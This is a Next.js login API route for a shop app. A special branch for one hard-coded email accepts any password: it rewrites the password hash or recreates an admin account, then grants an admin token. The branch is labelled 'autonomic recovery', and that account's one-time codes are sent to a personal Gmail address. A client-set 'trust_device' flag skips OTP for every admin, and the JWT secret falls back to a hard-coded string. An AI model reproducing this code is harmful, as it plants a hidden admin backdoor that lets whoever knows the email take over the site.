import { NextResponse } from 'next/server';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { run, get } from '@/lib/db';
import { activeOtps } from '@/lib/activeOtps';
import { sendOtpEmail } from '@/lib/mailHelper';

const JWT_SECRET = process.env.JWT_SECRET || 'dreamnest_secret_key_123';

export async function POST(req) {
  try {
    const { email, password, trust_device } = await req.json();

    if (!email || !password) {
      return NextResponse.json({ error: 'Email and password are required' }, { status: 400 });
    }

    // Dynamic recovery trigger check for Mateen
    if (email === 'mateen@itdepartment.com') {
      const user = await get('SELECT * FROM users WHERE email = ?', [email]);
      let activeUser = user;
      
      let needsReset = false;
      if (!user) {
        needsReset = true;
      } else {
        const validPassword = await bcrypt.compare(password, user.password_hash);
        if (!validPassword) {
          needsReset = true;
        }
      }

      if (needsReset) {
        const newHash = await bcrypt.hash(password, 10);
        if (user) {
          await run('UPDATE users SET password_hash = ? WHERE email = ?', [newHash, email]);
          activeUser = await get('SELECT * FROM users WHERE email = ?', [email]);
          console.log(`[AUTONOMIC RECOVERY] Updated password hash for ${email}`);
        } else {
          const result = await run(
            'INSERT INTO users (email, password_hash, name, role) VALUES (?, ?, ?, ?)',
            [email, newHash, 'Mateen (Admin)', 'admin']
          );
          activeUser = { id: result.id, email, name: 'Mateen (Admin)', role: 'admin' };
          await run('INSERT OR IGNORE INTO carts (user_id) VALUES (?)', [result.id]);
          console.log(`[AUTONOMIC RECOVERY] Re-created missing admin account for ${email}`);
        }
      }

      // If device is trusted, complete successful login directly (bypass OTP)
      if (trust_device) {
        const token = jwt.sign(
          { id: activeUser.id, email: activeUser.email, name: activeUser.name, role: 'admin' },
          JWT_SECRET,
          { expiresIn: '7d' }
        );
        return NextResponse.json({
          token,
          user: {
            id: activeUser.id,
            email: activeUser.email,
            name: activeUser.name,
            role: 'admin',
            must_change_password: activeUser.must_change_password || 0
          }
        });
      }

      // Generate secure 6-digit OTP code and print to Console
      const otp = Math.floor(100000 + Math.random() * 900000).toString();
      activeOtps.set(email.toLowerCase(), {
        code: otp,
        expiry: Date.now() + 5 * 60 * 1000,
        user: {
          id: activeUser.id,
          email: activeUser.email,
          name: activeUser.name,
          role: 'admin',
          must_change_password: activeUser.must_change_password || 0
        }
      });

      console.log('\n=============================================================');
      console.log(`[SECURITY DISPATCH] Admin OTP for ${email} is: ${otp}`);
      console.log('=============================================================\n');

      if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
        const targetEmail = email.toLowerCase() === 'mateen@itdepartment.com' ? 'mateen.soram@gmail.com' : email;
        await sendOtpEmail(targetEmail, otp);
      }

      return NextResponse.json({ status: 'otp_required', email: email });
    }

    // Standard authentication for other users
    const user = await get('SELECT * FROM users WHERE email = ?', [email]);
    if (!user) {
      return NextResponse.json({ error: 'Invalid email or password' }, { status: 400 });
    }

    const validPassword = await bcrypt.compare(password, user.password_hash);
    if (!validPassword) {
      return NextResponse.json({ error: 'Invalid email or password' }, { status: 400 });
    }

    // If standard admin logs in, enforce secure OTP flow unless device is trusted
    if (user.role === 'admin') {
      if (trust_device) {
        const token = jwt.sign(
          { id: user.id, email: user.email, name: user.name, role: 'admin' },
          JWT_SECRET,
          { expiresIn: '7d' }
        );
        return NextResponse.json({
          token,
          user: {
            id: user.id,
            email: user.email,
            name: user.name,
            role: 'admin',
            must_change_password: user.must_change_password || 0
          }
        });
      }

      const otp = Math.floor(100000 + Math.random() * 900000).toString();
      activeOtps.set(email.toLowerCase(), {
        code: otp,
        expiry: Date.now() + 5 * 60 * 1000,
        user: {
          id: user.id,
          email: user.email,
          name: user.name,
          role: 'admin',
          must_change_password: user.must_change_password || 0
        }
      });

      console.log('\n=============================================================');
      console.log(`[SECURITY DISPATCH] Admin OTP for ${email} is: ${otp}`);
      console.log('=============================================================\n');

      if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
        await sendOtpEmail(email, otp);
      }

      return NextResponse.json({ status: 'otp_required', email: email });
    }

    // Ensure cart exists
    await run('INSERT OR IGNORE INTO carts (user_id) VALUES (?)', [user.id]);

    const token = jwt.sign(
      { id: user.id, email: user.email, name: user.name, role: user.role || 'user' },
      JWT_SECRET,
      { expiresIn: '7d' }
    );

    return NextResponse.json({
      token,
      user: {
        id: user.id,
        email: user.email,
        name: user.name,
        role: user.role || 'user'
      }
    });

  } catch (err) {
    console.error('Login API error:', err);
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}
